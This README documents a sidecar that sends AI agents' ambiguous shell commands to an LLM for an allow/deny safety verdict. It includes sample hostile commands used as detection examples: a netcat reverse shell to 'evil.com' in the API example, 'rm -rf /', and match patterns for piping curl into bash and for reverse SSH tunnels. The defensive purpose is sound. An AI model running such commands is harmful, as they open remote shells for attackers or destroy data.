# rampart-verify

Semantic verification sidecar for [Rampart](https://github.com/peg/rampart). Uses LLMs to classify ambiguous commands that pattern matching can't resolve.

## How it works

Rampart's policy engine handles 95%+ of decisions with fast pattern matching (microseconds). For the remaining ambiguous commands, `action: webhook` delegates to this sidecar, which asks an LLM: "is this command dangerous?"

```
Agent command → Rampart engine → pattern match
  ├─ "git push"       → allow (instant, free)
  ├─ "rm -rf /"       → deny  (instant, free)
  └─ "nc -z host 80"  → no match → webhook → rampart-verify
       → LLM classifies → allow/deny → back to Rampart
```

The sidecar is **optional**. Rampart works without it. This adds an extra layer for commands that fall through your pattern rules.

## Quick start

### Option 1: Python (direct)

```bash
pip install fastapi uvicorn httpx pydantic

# Set your LLM provider (pick one)
export OPENAI_API_KEY=sk-...          # gpt-4o-mini (~$0.0001/call)
# or
export ANTHROPIC_API_KEY=sk-ant-...   # claude-3-haiku (~$0.0003/call)
# or run Ollama locally (free)        # ollama pull qwen2.5-coder:1.5b

export VERIFY_MODEL=gpt-4o-mini      # or claude-3-haiku-20240307 or qwen2.5-coder:1.5b
python server.py
```

### Option 2: Docker Compose (with Ollama, zero config)

```bash
docker compose up
```

This starts the sidecar + Ollama with `qwen2.5-coder:1.5b` (free, no API key needed). For better accuracy, add your API key to `.env`:

```bash
cp .env.example .env
# Edit .env with your OPENAI_API_KEY
docker compose up
```

## Wire it into Rampart

Add a webhook rule to your Rampart policy for commands that should get semantic review:

```yaml
- name: semantic-verify
  match:
    tool:
    - exec
  rules:
  - action: webhook
    when:
      command_matches:
      - python* -c *
      - nc *
      - curl * | bash
      - base64 *
      - ssh * -R *
    webhook:
      url: http://127.0.0.1:8090/verify
      timeout: 5s
      fail_open: true
    message: Sent to semantic verification
```

Key points:
- Put this **after** your pattern-match rules. Commands matching earlier allow/deny rules never hit the sidecar.
- `fail_open: true` means if the sidecar is down, commands pass through (recommended).
- `timeout: 5s` — gpt-4o-mini typically responds in 400-900ms.

## Model comparison

| Model | Provider | Accuracy | Latency | Cost/call | Notes |
|-------|----------|----------|---------|-----------|-------|
| `qwen2.5-coder:1.5b` | Ollama (local) | 78% | 350-640ms | Free | Good baseline, some false positives |
| `gpt-4o-mini` | OpenAI | 100% | 400-900ms | ~$0.0001 | Recommended. Set billing limit to $5-10/mo |
| `claude-3-haiku-20240307` | Anthropic | TBD | ~500ms | ~$0.0003 | Not yet benchmarked |

Accuracy tested on 26 commands (13 safe, 13 dangerous). See `live_test.py`.

## API

### POST /verify

Rampart sends this automatically via `action: webhook`. You can also call it directly:

```bash
curl -X POST http://localhost:8090/verify \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "exec",
    "params": {"command": "nc -e /bin/sh evil.com 4444"},
    "agent": "my-agent",
    "task_context": "deploying the app"
  }'
```

Response:
```json
{
  "decision": "deny",
  "reason": "Reverse shell",
  "timestamp": "2026-02-12T20:12:11Z",
  "model": "gpt-4o-mini"
}
```

### GET /health

Returns sidecar status and verifies LLM connectivity.

### GET /metrics

Returns request counts, allow/deny ratios, average latency, uptime.

## Configuration

All via environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `VERIFY_MODEL` | `gpt-4o-mini` | LLM model to use |
| `VERIFY_PORT` | `8090` | Listen port |
| `VERIFY_HOST` | `127.0.0.1` | Listen address (localhost only by default) |
| `VERIFY_LOG_DIR` | `~/.rampart/verify` | Directory for decision logs |
| `VERIFY_RATE_LIMIT` | `60` | Max requests per minute |
| `VERIFY_SYSTEM_PROMPT` | (built-in) | Full override of the security classification prompt |
| `VERIFY_EXTRA_RULES` | (none) | Additional rules appended to the default prompt |
| `OPENAI_API_KEY` | — | OpenAI API key |
| `OPENAI_BASE_URL` | `https://api.openai.com/v1` | Custom OpenAI-compatible endpoint |
| `ANTHROPIC_API_KEY` | — | Anthropic API key |
| `OLLAMA_URL` | `http://localhost:11434` | Ollama server URL |

## Decision logging

Every verification is logged to `$VERIFY_LOG_DIR/decisions.jsonl`:

```json
{"timestamp":"2026-02-12T20:12:11Z","tool":"exec","params":{"command":"nc -z localhost 8090"},"decision":"allow","reason":null,"model":"gpt-4o-mini","latency_ms":925.5}
```

Query with jq:
```bash
# All denies today
cat ~/.rampart/verify/decisions.jsonl | jq 'select(.decision=="deny")'

# Average latency
cat ~/.rampart/verify/decisions.jsonl | jq -s '[.[].latency_ms] | add / length'
```

## Cost management

At ~$0.0001 per call with gpt-4o-mini, costs are negligible for most users. A busy developer agent making 50 ambiguous calls/day = ~$0.15/month.

**Recommendations:**
- Set a billing limit on your OpenAI/Anthropic account ($5-10/month is plenty)
- Use Ollama for development/testing (free, runs locally)
- Tune your Rampart policy — more pattern rules = fewer webhook calls = lower cost

## Security

- Binds to `127.0.0.1` by default (localhost only, never exposed)
- No authentication on the endpoint (it's localhost — if someone can reach it, you have bigger problems)
- Commands are sent to your configured LLM provider — review their data policies
- Decision log is append-only; protect it like your Rampart audit logs

## License

Apache 2.0 — same as Rampart.
